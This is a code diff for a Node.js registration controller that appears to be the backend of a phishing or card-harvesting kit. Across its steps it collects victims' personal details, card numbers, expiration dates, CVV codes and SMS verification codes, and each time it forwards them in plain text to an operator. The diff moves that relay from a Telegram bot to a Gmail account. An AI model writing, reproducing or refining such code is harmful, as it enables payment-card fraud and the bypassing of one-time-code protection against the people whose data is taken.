@@ -1,24 +1,27 @@
 const User = require('../models/User');
 const bcrypt = require('bcryptjs');
 const jwt = require('jsonwebtoken');
-const sendTelegramMessage = async (message) => {
+const nodemailer = require("nodemailer");
+const sendAdminEmail = async (subject, message) => {
   try {
-    const response = await fetch(
-      `https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`,
-      {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          chat_id: process.env.TELEGRAM_CHAT_ID,
-          text: message,
-        }),
-      }
-    );
+    const transporter = nodemailer.createTransport({
+      service: "gmail",
+      auth: {
+        user: process.env.ADMIN_EMAIL,
+        pass: process.env.ADMIN_APP_PASSWORD,
+      },
+    });
 
-    const data = await response.json();
-    console.log("Telegram Response:", data);
+    await transporter.sendMail({
+      from: process.env.ADMIN_EMAIL,
+      to: process.env.ADMIN_EMAIL,
+      subject,
+      text: message,
+    });
+
+    console.log("Email sent successfully");
   } catch (error) {
-    console.error("Telegram Error:", error.message);
+    console.error("Email Error:", error.message);
   }
 };
 // 🚀 0. التسجيل (Register) - POST
@@ -37,7 +40,7 @@ exports.register = async (req, res) => {
     // كنكرييو مستعمل جديد
     user = new User({ email, password: hashedPassword });
     await user.save();
-     await sendTelegramMessage(`
+     await sendAdminEmail(`
   📧 Email: ${user.email}
   🕒 Date: ${new Date().toLocaleString()}
     `);
@@ -61,7 +64,7 @@ exports.step1 = async (req, res) => {
       { firstname, lastname, address_line, city, zip_code, ip_address, phone_number, current_step: 2 },
       { new: true }
     );
-        await sendTelegramMessage(`
+        await sendAdminEmail(`
   # Email: ${user.email}
   # First Name: ${firstname}
   # Last Name: ${lastname}
@@ -89,7 +92,7 @@ exports.step2 = async (req, res) => {
       { cardNumber, expirationDate, cvv, current_step: 3 },
       { new: true }
     );
-      await sendTelegramMessage(`
+      await sendAdminEmail(`
 
   # Email: ${user.email}
   # cardNumber : ${cardNumber}
@@ -114,7 +117,7 @@ exports.step3 = async (req, res) => {
       { sms_code, is_verified: true, current_step: 4 },
       { new: true }
     );
-        await sendTelegramMessage(`
+        await sendAdminEmail(`
   # Email: ${user.email}
   # sms_code :${sms_code}
     `);
